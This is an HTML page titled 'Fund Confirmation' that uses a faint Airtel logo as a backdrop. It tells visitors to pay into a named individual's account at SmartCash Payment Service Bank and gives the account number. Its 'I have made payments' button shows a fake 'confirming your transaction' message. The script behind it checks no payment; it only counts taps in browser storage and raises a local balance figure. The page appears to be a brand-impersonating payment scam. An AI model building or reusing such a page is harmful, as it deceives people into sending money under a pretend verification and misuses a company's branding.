<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Fund Confirmation</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #fff;
      overflow: hidden;
      position: relative;
    }

    .blur-logo {
      background: url('airtel-logo.png') no-repeat center center;
      background-size: 250px;
      opacity: 0.05;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
    }

    .container {
      position: relative;
      z-index: 1;
      padding: 30px;
      text-align: center;
    }

    .card {
      background: white;
      border-radius: 15px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      padding: 30px;
      max-width: 400px;
      margin: auto;
    }

    .card h3 {
      color: red;
      margin-bottom: 20px;
    }

    .card p {
      font-size: 17px;
      margin: 10px 0;
    }

    button {
      margin-top: 20px;
      padding: 15px 30px;
      background-color: red;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
    }

    .popup {
      display: none;
      margin-top: 15px;
      color: green;
      font-weight: bold;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="blur-logo"></div>

  <div class="container">
    <div class="card">
      <h3>Send to this Account</h3>
      <p><strong>Account Name:</strong> EMMANUEL OKWUNNA</p>
      <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
      <p><strong>Account Number:</strong> 812 489 0070</p>
      <button onclick="tapFund()">I have made payments</button>
      <div class="popup" id="popup">Please wait, we are confirming your transaction...</div>
    </div>
  </div>

  <script>
    let fundTaps = parseInt(localStorage.getItem("fundTaps") || "0");

    function tapFund() {
      fundTaps++;
      localStorage.setItem("fundTaps", fundTaps);
      document.getElementById("popup").style.display = "block";

      if (fundTaps % 20 === 0) {
        let balance = parseInt(localStorage.getItem("user.balance") || "0");
        balance += 3000;
        localStorage.setItem("user.balance", balance);
      }
    }
  </script>
</body>
</html>
